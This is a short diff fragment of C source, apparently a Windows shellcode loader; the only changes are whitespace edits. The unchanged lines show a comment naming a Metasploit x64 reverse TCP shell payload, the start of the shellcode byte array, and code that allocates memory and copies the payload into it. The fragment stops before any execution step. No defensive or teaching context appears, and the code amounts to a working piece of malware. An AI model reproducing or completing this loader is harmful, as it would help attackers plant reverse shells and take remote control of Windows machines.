@@ -18,7 +18,7 @@ desktop\d1rkmtr
 int main() {
 
 	// use payload/windows/x64/shell_reverse_tcp
-	// generate -f c 
+	// generate -f c
 	unsigned char payload[] =
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
 		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -48,7 +48,7 @@ int main() {
 		printf("Failed to Allocate memory (%u)\n", GetLastError());
 		return -1;
 	}
-	
+
 	MoveMemory(alloc_mem, payload, sizeof(payload));
 	//RtlMoveMemory(alloc_mem, payload, sizeof(payload));
 
